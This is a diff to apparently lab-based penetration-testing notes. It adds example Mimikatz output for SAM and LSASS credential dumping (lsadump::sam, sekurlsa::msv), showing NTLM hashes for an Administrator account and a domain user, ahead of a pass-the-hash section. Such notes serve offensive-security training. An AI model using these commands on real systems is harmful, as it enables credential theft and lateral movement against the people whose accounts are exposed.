@@ -599,10 +599,39 @@ Example Mimikatz commands:
 privilege::debug
 token::elevate
 lsadump::sam
+
+# Example output
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # lsadump::sam   
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 145e02c50333951f71d13c245d352b50
+
 ```
 
 ```
 sekurlsa::msv
+
+# Example of output
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # sekurlsa::msv 
+Authentication Id : 0 ; 308124 (00000000:0004b39c)
+Session           : RemoteInteractive from 2 
+User Name         : bob.jenkins
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 2022/04/22 09:55:02
+SID               : S-1-5-21-3330634377-1326264276-632209373-4605
+        msv :
+         [00000003] Primary
+         * Username : bob.jenkins
+         * Domain   : ZA
+         * NTLM     : 6b4a57f67805a663c818106dc0648484
+
 ```
 
 ### Using PtH with Mimikatz
